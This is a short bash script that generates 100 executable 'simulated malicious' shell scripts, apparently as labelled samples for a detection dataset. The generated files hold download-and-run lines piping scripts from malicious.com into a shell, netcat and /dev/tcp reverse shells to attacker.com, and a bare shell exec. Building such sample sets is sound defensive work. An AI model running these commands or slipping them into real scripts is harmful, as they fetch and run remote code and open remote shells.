#!/bin/bash

mkdir -p dataset/malicious

for i in $(seq 1 100); do
    filename="dataset/malicious/fake${i}.sh"
    
    case $((RANDOM % 5)) in
        0)
            echo -e "#!/bin/bash\ncurl http://malicious.com/script${i}.sh | bash" > "$filename"
            ;;
        1)
            echo -e "#!/bin/bash\nwget http://malicious.com/payload${i}.sh -O - | sh" > "$filename"
            ;;
        2)
            echo -e "#!/bin/bash\nexec /bin/sh" > "$filename"
            ;;
        3)
            echo -e "#!/bin/bash\nnc -e /bin/bash attacker.com $((1000 + i))" > "$filename"
            ;;
        4)
            echo -e "#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/$((2000 + i)) 0>&1" > "$filename"
            ;;
    esac

    chmod +x "$filename"
done

echo "100 archivos maliciosos simulados generados en dataset/malicious/"
